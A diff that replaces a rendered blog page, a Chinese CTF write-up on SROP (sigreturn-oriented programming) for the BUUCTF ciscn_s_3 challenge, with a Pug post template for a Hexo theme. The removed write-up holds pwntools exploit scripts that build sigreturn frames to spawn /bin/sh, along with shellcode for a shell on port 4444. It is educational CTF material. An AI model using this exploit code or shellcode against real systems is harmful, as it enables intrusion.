@@ -1,322 +1,107 @@
-<!DOCTYPE HTML>
-<html class="no-js" lang="zh-CN">
-<!--
-//                            _ooOoo_
-//                           o8888888o
-//                           88" . "88
-//                           (| -_- |)
-//                            O\ = /O
-//                        ____/`---'\____
-//                      .   ' \\| |// `.
-//                       / \\||| : |||// \
-//                     / _||||| -:- |||||- \
-//                       | | \\\ - /// | |
-//                     | \_| ''\---/'' | |
-//                      \ .-\__ `-` ___/-. /
-//                   ___`. .' /--.--\ `. . __
-//                ."" '< `.___\_<|>_/___.' >'"".
-//               | | : `- \`.;`\ _ /`;.`/ - ` : | |
-//                 \ \ `-. \_ __\ /__ _/ .-` / /
-//         ======`-.____`-.___\_____/___.-`____.-'======
-//                            `=---='
-//                 拦截插件累计拦截逗比攻击"1381438"次！
-//         .............................................
-//                  佛祖保佑             永无BUG
-//          佛曰:
-//                  写字楼里写字间，写字间里程序员；
-//                  程序人员写程序，又拿程序换酒钱。
-//                  酒醒只在网上坐，酒醉还来网下眠；
-//                  酒醉酒醒日复日，网上网下年复年。
-//                  但愿老死电脑间，不愿鞠躬老板前；
-//                  奔驰宝马贵者趣，公交自行程序员。
-//                  别人笑我忒疯癫，我笑自己命太贱；
-//                  不见满街漂亮妹，哪个归得程序员？
--->
-<head><meta name="generator" content="Hexo 3.8.0">
-    <!--[if lte IE 9]>
-<meta http-equiv="refresh" content="0;url=http://yoursite.com/warn.html">
-<![endif]-->
-<meta charset="utf-8">
+extends includes/layout.pug
 
-<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+block top_img
+  - var top_img = page.top_img || theme.post_meta.top_img || theme.top_img || config.top_img
+  if (top_img && page.top_img !== false)
+    - var bg_img = top_img !== true ? `background-image: url(${top_img})` : ''
+    - var flag = top_img === true ? 'no-bg' : ''
+    div#top-container(style=bg_img class=flag)
+      include ./includes/header.pug
+      #post-info
+        #post-title= page.title || _p('no_title')
+        #post-meta
+          if (theme.post_meta.date_type)
+            if (theme.post_meta.date_type === 'both')
+              time.post-meta__date
+                i.fa.fa-calendar(aria-hidden="true")
+                =' '+_p('post.created')+' '+date(page.date, config.date_format)
+                span.post-meta__separator |
+                i.fa.fa-calendar-check-o(aria-hidden="true")
+                =' '+_p('post.updated')+' '+date(page.updated, config.date_format)
+            else
+              - var date_type = theme.post_meta.date_type === 'updated' ? 'updated' : 'date'
+              time.post-meta__date #[i.fa.fa-calendar(aria-hidden="true")] #[=date(page[date_type], config.date_format)]
+          if (theme.post_meta.categories && page.categories.data.length > 0)
+            if (theme.post_meta.date_type)
+              span.post-meta__separator |
+            each item, index in page.categories.data
+              i.fa.fa-inbox.post-meta__icon(aria-hidden="true")
+              a(href=url_for(item.path)).post-meta__categories #[=item.name]
+              if (index < page.categories.data.length - 1)
+                 i.fa.fa-angle-right(aria-hidden="true")
+          if (theme.disqus.enable && theme.disqus.count)
+            if (theme.post_meta.date_type || theme.post_meta.categories && page.categories.data.length > 0)
+              span.post-meta__separator |
+            i.fa.fa-comment-o.post-meta__icon(aria-hidden="true")
+            a(href=url_for(page.path) + '#disqus_thread')
+              span.disqus-comment-count(data-disqus-identifier=page.path)
+          if (theme.wordcount && theme.wordcount.enable)
+            .post-meta-wordcount
+              span= _p('post.wordcount') + ': '
+              span.word-count= wordcount(page.content)
+              span.post-meta__separator |
+              span= _p('post.min2read', min2read(page.content, {cn: 350, en: 160}))
+  else
+    div#top-container.plain
+      include ./includes/header.pug
 
-<meta http-equiv="X-UA-Compatible" content="IE=Edge">
-<meta name="renderer" content="webkit">
-<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
-<meta http-equiv="mobile-agent" content="format=html5; url=http://yoursite.com">
-<meta name="author" content="treebacker">
-<link rel="stylesheet" href="../../../../css/SimpleStyle.min.css">
-
-<link rel="shortcut icon" href="../../../../images/favicon.png">
-
-
-<title>Watch Security</title>
-
-<meta name="keywords" content="Reverse, Security, New">
-
-<meta name="description " content="">
-
-</head>
-<body>
-<div id="nav">
-    <nav class="nav-menu">
-        <a class="site-name current" href="/" title="Tree">Tree</a>
-        <a class="site-index current" href="/"><i class="fa fa-home"></i><span>首页</span></a>
-        <a href="/archives" title="归档"><i class="fa fa-archives"></i><span>归档</span></a>
-        <a href="/tags" title="标签"><i class="fa fa-tags"></i><span>标签</span></a>
-        <!-- custom single page of menus -->
-        
-        
-        <a href="/help" title="帮助">
-            <i class="fa fa-question-circle"></i>
-            <span>帮助</span>
-        </a>
-        
-    </nav>
-</div>
-
-<div class="nav-user">
-    <a class="btn-search" href="#"><i class="fa fa-search"></i></a>
-    <a class="btn-read-mode" href="#"><i class="fa fa-sun-o"></i></a>
-    <a class="btn-sns-qr" href="javascript:"><i class="fa fa-telegram"></i></a>
-</div>
-
-<div id="wrapper" class="clearfix">
-    <div id="body">
-        <div class="main" id="main">
-            <div id="cover">
-    <div class="cover-img"></div>
-    <div class="cover-info">
-        
-        <h1 class="cover-siteName">Treebacker</h1>
-        <h3 class="cover-siteTitle">愿麦子和麦子长在一起，愿河流与河流流归一处。</h3>
-        <p class="cover-siteDesc">岁月易逝，痕影难觅</p>
-        <div class="cover-sns">
-            
-            <div class="btn btn-github">
-                <a href="https://github.com/treebacker" target="_blank" title="github" ref="friend">
-                    <i class="fa fa-github"></i>
-                </a>
-            </div>
-            
-        </div>
-    </div>
-</div>
-            <div class="page-title">
-    <ul>
-        <li><a href="/">最新</a></li>
-        
-        
-        
-        <li class="page-search">
-    <form id="search" class="search-form">
-        <label for="s" class="sr-only">请输入关键字</label>
-        <input class="search-field" type="text" name="s" placeholder="请输入关键字">
-        <button type="submit" class="search-form-submit" title="搜索"><i class="fa fa-search"></i></button>
-    </form>
-    <div class="ins-search">
-    <div class="ins-search-mask"></div>
-    <div class="ins-search-container">
-        <div class="ins-input-wrapper">
-            <input type="text" class="ins-search-input" placeholder="请输入关键词...">
-            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
-        </div>
-        <div class="ins-section-wrapper">
-            <div class="ins-section-container"></div>
-        </div>
-    </div>
-</div>
-<script>
-(function (window) {
-    var INSIGHT_CONFIG = {
-        TRANSLATION: {
-            POSTS: '文章',
-            PAGES: '页面',
-            CATEGORIES: '分类',
-            TAGS: '标签',
-            UNTITLED: '(无标题)',
-        },
-        ROOT_URL: '/',
-        CONTENT_URL: '../../../../content.json',
-    };
-    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
-})(window);
-</script>
-</li>
-
-    </ul>
-</div>
-<div class="main-inner">
-    <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
-        <div class="post-header">
-            <div class="post-author clearfix">
-                <a class="avatar fleft" href="" target="_blank">
-                    <img width="48" src="" alt="avatar">
-                </a>
-                <p><span class="label">作者</span>
-                    <a href="" target="_blank"></a>
-                    <span title="最后编辑于2019-11-01">2019-11-01</span>
-                </p>
-                <p></p>
-            </div>
-            <h2 class="post-title"></h2>
-            <div class="post-meta">
-                本文总共4452个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
-            </div>
-        </div>
-        <div class="post-content markdown-body">
-            <p>title: 栈溢出SROP攻击<br>entitle: ‘’<br>author: Treebacker<br>avatar: /images/favicon.png<br>autherDesc: Tree下的Backer<br>categories: 技术<br>date: 2019-09-30 15:39:52<br>authorLink:<br>authorAbout:<br>tags: pwn<br>keywords: sigreturn<br>description: signal机制缺陷</p>
-<h3 id="高级ROP-SROP利用"><a href="#高级ROP-SROP利用" class="headerlink" title="高级ROP-SROP利用"></a>高级ROP-SROP利用</h3><p>​                                                                                    在刷题时碰到这个考察点，有点震撼，特意记录下。</p>
-<h4 id="SROP简介"><a href="#SROP简介" class="headerlink" title="SROP简介"></a>SROP简介</h4><ul>
-<li><p>SROP也即Sigreturn Oriented Programming。很显然这种攻击方式与Unix系统调用Sigreturn相关。它在发生signal的时候会被间接调用。</p>
-</li>
-<li><p>Signal在unix下的机制（窃图），发生signal时，会在user和kernel直接切换。系统会为当前进程保存上下文。完成后会从核心态退出时，会执行sigreturn恢复上下文。</p>
-<p><img src="F:/blog/source/_posts/栈溢出SROP攻击/1.png" alt=""></p>
-<p>在这四步过程中，第三步是关键，即如何使得用户态的signal handler执行完成之后能够顺利返回内核态。在类UNIX的各种不同的系统中，这个过程有些许的区别，但是大致过程是一样的。这里以Linux为例：</p>
-<p>在第二步的时候，内核会帮用户进程将其上下文保存在该进程的栈上，然后在栈顶填上一个地址<code>rt_sigreturn</code>，这个地址指向一段代码，在这段代码中会调用<code>sigreturn</code>系统调用。因此，当signal handler执行完之后，栈指针（stack pointer）就指向<code>rt_sigreturn</code>，所以，signal handler函数的最后一条<code>ret</code>指令会使得执行流跳转到这段sigreturn代码，被动地进行<code>sigreturn</code>系统调用。下图显示了栈上保存的用户进程上下文、signal相关信息，以及<code>rt_sigreturn</code>：</p>
-<p><img src="F:/blog/source/_posts/栈溢出SROP攻击/2.png" alt=""></p>
-<p>上面这段内存又称为”Signal Frame”。</p>
-</li>
-</ul>
-<h4 id="SROP-Attack原理"><a href="#SROP-Attack原理" class="headerlink" title="SROP Attack原理"></a>SROP Attack原理</h4><ul>
-<li><p>问题出现在，内核保存的上下文是在用户态控制的栈上（可以伪造的），而切换为用户态时，并没有检查这段内存是否发生改变。也就造成了可利用的可能。</p>
-</li>
-<li><p>攻击示意图</p>
-<p><img src="F:/blog/source/_posts/栈溢出SROP攻击/3.png" alt=""></p>
-</li>
-<li><p>上面的攻击中，需要满足以下几个条件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、 存在栈溢出</span><br><span class="line">2、可以泄露栈地址，（即可以知道参数的地址）</span><br><span class="line">3、需要syscall的地址</span><br><span class="line">4、需要sigreturn的地址			（强制按照frame内存恢复进程状态）</span><br></pre></td></tr></table></figure>
-<p>相比较传统的ROP攻击，需要的gadgets更少，构造更方便。</p>
-</li>
-<li><p>连续攻击</p>
-<p><img src="F:/blog/source/_posts/栈溢出SROP攻击/8.png" alt=""></p>
-<p>只需要设置栈指针rsp的值为下一个攻击地址，同时rip的地址设置为&amp;(syscall; ret;)即可。</p>
-</li>
-</ul>
-<h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><ul>
-<li><p><a href="https://buuoj.cn/challenges" target="_blank" rel="noopener">BUUCTF</a>ciscn_s_3题目</p>
-<ul>
-<li><p>漏洞分析</p>
-<p><img src="F:/blog/source/_posts/栈溢出SROP攻击/4.png" alt=""></p>
-<p>这里有两个系统调用，需要在gdb调试，发现就是read和write操作。且存在栈溢出</p>
-</li>
-<li><h5 id="一般ROP"><a href="#一般ROP" class="headerlink" title="一般ROP"></a>一般ROP</h5><ul>
-<li><p>泄露libc地址，利用gadgets执行execve或者system或者one_gadget。</p>
-</li>
-<li><p>实际操作发现，rdx的值我们无法控制。execve和system都是行不通的。但是发现一个有趣的gadget</p>
-<p><img src="F:/blog/source/_posts/栈溢出SROP攻击/5.png" alt=""></p>
-<p>这里，实际提供了一个mov eax, 0; ret;的gadget。为one_gadget和read的syscall都可以提供基础。</p>
-<p>当然，也可以利用eax是作为函数的返回值的这一个特性，利用read特定的字节得到需要的eax。（注意这里的read也可以是syscall实现的，且上面的mov eax, 0 的gadget可以为我们syscall read提供条件）</p>
-</li>
-<li><p>可以one_gadget达到get shell的目的。</p>
-</li>
-</ul>
-</li>
-<li><h5 id="SROP和攻击。"><a href="#SROP和攻击。" class="headerlink" title="SROP和攻击。"></a>SROP和攻击。</h5><ul>
-<li><p>看到这个题目很少人做出来，猜到应该不是这么简单的操作。而且程序中明确指出的gadget很奇怪</p>
-<p><img src="F:/blog/source/_posts/栈溢出SROP攻击/6.png" alt=""></p>
-<p>15的系统号是rt_sigreturn，3b的系统调用是execve。（我都没用到。。。）</p>
-</li>
-<li><p>搜索一番，看到<a href="[https://leppwn.github.io/2019/09/13/%E3%80%90BUUCTF%E3%80%91Pwn--ciscn_2019_s_3/](https://leppwn.github.io/2019/09/13/[BUUCTF]Pwn--ciscn_2019_s_3/">一个师傅</a>)的骚操作。</p>
-</li>
-<li><p>就是我们上面提到的SROP攻击思路，泄露栈地址、并且syscall和rt_sigreturn的gadget都是有的。</p>
-</li>
-<li><p>学习一波，记录这种方式的exp（pwntools提供了Sigreturn Frame的构建）</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"/bin/sh\x00"</span></span><br><span class="line">payload += <span class="string">'\x00'</span> * <span class="number">8</span></span><br><span class="line">payload += p64(main)</span><br><span class="line">p.send(payload)					<span class="comment">#write(1, stack_addr, 0x30)</span></span><br><span class="line">								<span class="comment">#will leak an address on stack</span></span><br><span class="line">p.recv(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">stack_addr = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x118</span>	<span class="comment">#rsi</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"stack_addr ==&gt; "</span> + hex(stack_addr)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#SROP Attack</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = stack_addr					<span class="comment">#&amp;'/bin/sh'</span></span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rsp = stack_addr</span><br><span class="line">frame.rip = syscall</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x10</span></span><br><span class="line">payload += p64(rt_sigreturn)			<span class="comment">#强制sigreturn，改变frame</span></span><br><span class="line">payload += p64(syscall)</span><br><span class="line">payload += str(frame)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-</li>
-<li><h5 id="拓展利用-连续攻击生成backdoor。（return-shell-with-reverse-tcp-0-0-0-0-4444"><a href="#拓展利用-连续攻击生成backdoor。（return-shell-with-reverse-tcp-0-0-0-0-4444" class="headerlink" title="拓展利用-连续攻击生成backdoor。（return shell with reverse tcp 0.0.0.0 4444)"></a>拓展利用-连续攻击生成backdoor。（return shell with reverse tcp 0.0.0.0 4444)</h5><ul>
-<li>这里用到mprotect(start, len, prot)修改栈为RWX属性。</li>
-</ul>
-</li>
-<li><p>直接设置fake frame的rsp为shellcode的地址。</p>
-</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">  main = <span class="number">0x4004F1</span></span><br><span class="line">syscall = <span class="number">0x400517</span> 			<span class="comment">#syscall; ret</span></span><br><span class="line">  rt_sigreturn = <span class="number">0x4004DA</span> 		<span class="comment">#mov eax, 0xf; ret</span></span><br><span class="line">		</span><br><span class="line">  payload = <span class="string">'\x00'</span> * <span class="number">0x10</span></span><br><span class="line">payload += p64(main)</span><br><span class="line">  p.send(payload)					<span class="comment">#write(1, stack_addr, 0x30)</span></span><br><span class="line">								<span class="comment">#will leak an address on stack</span></span><br><span class="line">  p.recv(<span class="number">32</span>)</span><br><span class="line">  </span><br><span class="line">  stack_addr = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x118</span>	<span class="comment">#rsi</span></span><br><span class="line">  <span class="keyword">print</span> <span class="string">"stack_addr ==&gt; "</span> + hex(stack_addr)</span><br><span class="line">  p.recv(<span class="number">8</span>)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  frame1 = SigreturnFrame()				</span><br><span class="line">  frame1.rax = constants.SYS_mprotect</span><br><span class="line">  frame1.rdi = stack_addr &amp; <span class="number">0xFFFFFFFFFFFFF000</span></span><br><span class="line">  frame1.rsi = <span class="number">0x1000</span>							</span><br><span class="line">  frame1.rdx = <span class="number">7</span>							</span><br><span class="line">  frame1.rsp = stack_addr + <span class="number">0x120</span>		<span class="comment">#frame2_sigreturn</span></span><br><span class="line">  frame1.rip = syscall</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  shellcode =  <span class="string">"\x6a\x29\x58\x6a\x02\x5f\x6a\x01"</span> \</span><br><span class="line">  		 	<span class="string">"\x5e\x48\x31\xd2\x0f\x05\x48\x97"</span> \</span><br><span class="line">  		 <span class="string">"\x6a\x02\x66\xc7\x44\x24\x02\x11"</span> \</span><br><span class="line">  		 <span class="string">"\x5c\x54\x6a\x2a\x58\x5e\x6a\x10"</span> \</span><br><span class="line">  		 <span class="string">"\x5a\x0f\x05\x6a\x03\x5e\x6a\x21"</span> \</span><br><span class="line">  		 <span class="string">"\x58\x48\xff\xce\x0f\x05\xe0\xf6"</span> \</span><br><span class="line">  		 <span class="string">"\x48\x31\xf6\x56\x48\xbf\x2f\x62"</span> \</span><br><span class="line">  		 <span class="string">"\x69\x6e\x2f\x2f\x73\x68\x57\x54"</span> \</span><br><span class="line">  		 <span class="string">"\x5f\xb0\x3b\x99\x0f\x05"</span></span><br><span class="line">  </span><br><span class="line">  payload = <span class="string">'\x00'</span>*<span class="number">0x10</span> 					<span class="comment">#rop_chain  stack_addr+8</span></span><br><span class="line">  payload += p64(rt_sigreturn)</span><br><span class="line">  payload += p64(syscall)					<span class="comment">#sigreturn</span></span><br><span class="line">  payload += str(frame1)</span><br><span class="line">  payload += p64(stack_addr + <span class="number">0x128</span>)</span><br><span class="line">payload += shellcode</span><br></pre></td></tr></table></figure>
-<ul>
-<li><p>在4444监听之后，运行exp就可以看到得到了返回的shell。</p>
-<p><img src="F:/blog/source/_posts/栈溢出SROP攻击/7.png" alt=""></p>
-</li>
-</ul>
-</li>
-<li><h5 id="几个注意点"><a href="#几个注意点" class="headerlink" title="几个注意点"></a>几个注意点</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、一个frame框架是0xf8大小（0x64)。</span><br><span class="line">2、泄露的栈地址，返回再次利用时，偏移可能有些变动，建议调试确定。</span><br><span class="line">3、对于连续利用的所有指针参数，利用pop_ret的方式将参数保存在栈上，从而可以确参数定地址。</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<h4 id="SROP与ROP的比较"><a href="#SROP与ROP的比较" class="headerlink" title="SROP与ROP的比较"></a>SROP与ROP的比较</h4><ul>
-<li>利用难度。众所周知，ROP的攻击方式比较普遍，安全防护相应的也比较多。在真实的系统中，相应的gadgets比较难以获取。反观SROP，需要的gadgets少，主要在于伪造一个Frame。</li>
-<li>代码复用性。由于ROP极大的依赖于栈结构，gadgets片段都是保存在stack上，所以在一次利用结束后，在stack发生改变的时候，很难再次利用（有时候即使返回init状态，也难以再次恢复stack状态）。而SROP则不然，每次只需要伪造对应的Frame，rt_sigreturn的调用都能够强制切换到我们需要的状态。有着极高的代码复用性。</li>
-</ul>
-<h4 id="SROP攻击的更多资料"><a href="#SROP攻击的更多资料" class="headerlink" title="SROP攻击的更多资料"></a>SROP攻击的更多资料</h4><ul>
-<li><p><a href="http://www.ieee-security.org/TC/SP2014/papers/FramingSignals-AReturntoPortableShellcode.pdf" target="_blank" rel="noopener">paper</a></p>
-</li>
-<li><p><a href="https://tc.gtisc.gatech.edu/bss/2014/r/srop-slides.pdf" target="_blank" rel="noopener">slides</a></p>
-</li>
-<li><p><a href="https://www.freebuf.com/articles/network/87447.html" target="_blank" rel="noopener">Sigreturn Oriented Programming (SROP) Attack攻击原理</a></p>
-<p>​                                            </p>
-</li>
-</ul>
-<h4 id="多说一句"><a href="#多说一句" class="headerlink" title="多说一句"></a>多说一句</h4><ul>
-<li>这种攻击方式，真心地觉得强大。。。</li>
-</ul>
-<p>本文<a href="https://mp.weixin.qq.com/s?__biz=MjM5MTYxNjQxOA==&amp;mid=2652852168&amp;idx=1&amp;sn=2cb232d26568f1268426d25487e5fb72&amp;chksm=bd5933058a2eba1395789b34d0956e2e96b7e168e97f54ccdc40ec7ee6b147c51d188d253b1c&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1570933142474&amp;sharer_shareid=0bf2730e2a16b6bbdfbb4041cbbeecd0#rd" target="_blank" rel="noopener">合天智汇首发</a></p>
-
-        </div>
-        <div class="post-tool">
-            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
-                <i class="fa fa-thumbs-up" aria-hidden="true"></i> 打赏
-            </a>
-        </div>
-        
-        <div class="post-tags">标签：
-            
-        </div>
-        
-    </article>
-    
-    <p>本文代表个人观点，内容仅供参考。若有不恰当之处，望不吝赐教！</p>
-    
-    
-</div>
-<script src="../../../../js/busuanzi.pure.mini.js"></script>
-
-        </div><!-- end #main-->
-    </div><!-- end #body -->
-    <footer class="footer">
-    <div class="footer-inner">
-        <p>
-            <a href="/about" title="关于本站">关于本站</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
-            <!-- 自定义链接 -->
-            <a href="/help" title="help">急救中心</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
-            <a href="/app" title="App下载">App下载</a>
-        </p>
-        <p>
-            本站点采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a>，已建立<a href="/timeline" id="siteBuildingTime"></a>天<br>
-            ©2017 基于<a href="http://hexo.io" target="_blank">Hexo</a>搭建
-            ，主题&nbsp<a href="https://github.com/tangkunyin/hexo-theme-jsimple" target="_blank">JSimple</a>
-            ，作者<a href="https://www.tangkunyin.com" target="_blank">唐先森</a>
-            ，Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a>
-        </p>
-        
-
-    </div>
-</footer>
-<script src="../../../../js/InsightSearch.js"></script>
-<script src="../../../../js/SimpleCore.js"></script>
-
-</div>
-<div class="fixed-btn">
-    <a class="btn-gotop" href="javascript:"> <i class="fa fa-angle-up"></i></a>
-</div>
-<script>
-    $(function () {
-        SimpleCore.init({
-            buildingTime: '11/22/2018',
-            current: $('.post-tags').length > 0 ? 'post' : 'archive',
-            snsQRCode: '/images/sns-qrcode.png',
-            donateImg: '/images/donate-qr.png',
-        });
-    });
-</script>
-</body>
-</html>
+block content
+  article#post(class="")
+    if (!top_img)
+      #post-title.plain= page.title || _p('no_title')
+      #post-meta
+        if (theme.post_meta.date_type)
+          - var date_type = theme.post_meta.date_type === 'updated' ? '' : 'date'
+          time.post-meta__date #[i.fa.fa-calendar(aria-hidden="true")] #[=date(page[date_type], config.date_format)]
+        if (theme.post_meta.categories && page.categories.data.length > 0)
+          if (theme.post_meta.date_type)
+            span.post-meta__separator |
+          each item, index in page.categories.data
+            i.fa.fa-inbox(aria-hidden="true")
+            a(href=url_for(item.path)).post-meta__categories  #[=item.name]
+            if (index < page.categories.data.length - 1)
+                i.fa.fa-angle-right.post-meta__separator(aria-hidden="true")
+        if (theme.disqus.enable && theme.disqus.count)
+          if (theme.post_meta.date_type || theme.post_meta.categories && page.categories.data.length > 0)
+            span.post-meta__separator |
+          i.fa.fa-comment-o(aria-hidden="true")
+          a(href=url_for(page.path) + '#disqus_thread')
+            span.disqus-comment-count(data-disqus-identifier=page.path)
+        if (theme.wordcount && theme.wordcount.enable)
+          span.post-meta__separator |
+          span.post-meta-wordcount
+            span= _p('post.wordcount') + ': '
+            span.word-count= wordcount(page.content)
+            span.post-meta__separator |
+            span= _p('post.min2read', min2read(page.content, {cn: 350, en: 160}))
+    #post-content.article-container!= page.content
+  if (theme.post_copyright && theme.post_copyright.enable)
+    .post-copyright
+      .post-copyright__author
+        span.post-copyright-meta= _p('post.copyright.author') + ": "
+        span.post-copyright-info
+          a(href=`mailto:${config.email}`) #[=config.author]
+      .post-copyright__type
+        span.post-copyright-meta= _p('post.copyright.link') + ": "
+        span.post-copyright-info
+          a(href=url_for(page.permalink)) #[=page.permalink]
+      .post-copyright__notice
+        span.post-copyright-meta= _p('post.copyright.copyright_notice') + ": "
+        span.post-copyright-info!= _p('post.copyright.copyright_content', theme.post_copyright.license_url, theme.post_copyright.license, config.url, config.title)
+  if (theme.post_meta.tags)
+    .post-meta__tag-list
+      each item, index in page.tags.data
+        a(href=url_for(item.path)).post-meta__tags #[=item.name]
+  if (theme.QR_code)
+    if (theme.QR_code.length > 0)
+      .post-qr-code
+        each item in theme.QR_code
+          .post-qr-code-item
+            img.post-qr-code__img(src=(item.itemlist||item).img)
+            .post-qr-code__desc=(item.itemlist||item).text
+  include includes/share/index.pug
+  include includes/pagination.pug
+  if (theme.adv && theme.adv.enable)
+    .post-adv!= theme.adv.info
+  if page.comments !== false
+    include includes/comments/index.pug
